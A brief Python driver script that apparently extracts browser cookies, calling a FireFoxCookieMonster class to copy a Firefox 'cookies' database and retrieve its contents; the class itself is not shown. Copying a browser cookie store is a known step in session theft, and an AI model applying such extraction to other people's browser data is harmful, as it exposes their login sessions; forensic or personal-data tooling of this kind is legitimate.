from src.FireFoxCookieMonster import FireFoxCookieMonster

def main():



    databaseloc = 'cookies'

    firefoxCookieMonster = FireFoxCookieMonster(databaseloc)

    firefoxCookieMonster.copyDatabase()

    firefoxCookieMonster.retrieveCookies()




if __name__ == "__main__":
    main()
